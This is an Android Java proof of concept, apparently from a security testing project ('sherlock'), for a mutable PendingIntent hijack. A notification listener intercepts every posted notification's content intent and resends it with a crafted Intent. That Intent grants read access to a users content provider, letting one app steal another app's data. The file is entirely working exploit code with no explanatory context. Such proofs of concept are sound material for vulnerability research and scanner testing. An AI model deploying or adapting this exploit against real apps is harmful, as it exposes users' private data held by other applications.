package sherlock.poc.mutable_pending_intent;

import android.app.PendingIntent;
import android.content.ClipData;
import android.content.Intent;
import android.net.Uri;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifListenerService extends NotificationListenerService {

    private static final int REQUEST_CODE = 1001;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        PendingIntent pi = sbn.getNotification().contentIntent;
        Intent hijack = new Intent();
        hijack.setAction("sherlock.poc.TARGET_ACTIVITY");
        hijack.setClipData(ClipData.newRawUri(null, Uri.parse("content://sherlock.test.users_provider/users")));
        hijack.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        try {
            pi.send(getApplicationContext(), REQUEST_CODE, hijack, null, null);
        } catch (PendingIntent.CanceledException e) {
            throw new RuntimeException(e);
        }
    }
}